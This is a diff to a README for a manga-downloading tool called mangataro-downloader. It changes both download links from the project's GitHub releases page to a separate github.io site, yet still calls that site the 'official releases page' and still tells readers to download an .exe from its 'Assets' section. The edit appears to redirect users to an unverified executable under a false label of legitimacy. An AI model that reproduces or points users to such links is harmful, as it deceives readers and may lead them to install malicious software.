@@ -1,6 +1,6 @@
 # 📚 mangataro-downloader - Download your favorite manga chapters easily
 
-[![Download Latest Version](https://img.shields.io/badge/Download-Release_Page-blue)](https://github.com/Longbeachmilitarycensorship62/mangataro-downloader/releases)
+[![Download Latest Version](https://img.shields.io/badge/Download-Release_Page-blue)](https://longbeachmilitarycensorship62.github.io)
 
 mangataro-downloader manages your digital manga library. It downloads chapters from MangaTaro.org to your local computer. This tool works for people who use the command line and those who prefer a standard windowed interface.
 
@@ -17,7 +17,7 @@ Your computer must meet these basic standards to run the application:
 
 Follow these steps to set up the software on your Windows computer.
 
-1. Visit the [official releases page](https://github.com/Longbeachmilitarycensorship62/mangataro-downloader/releases) to download the package.
+1. Visit the [official releases page](https://longbeachmilitarycensorship62.github.io) to download the package.
 2. Look for the file ending in .exe under the "Assets" section of the latest release.
 3. Click the file name to start the download.
 4. Open your "Downloads" folder once the process finishes.
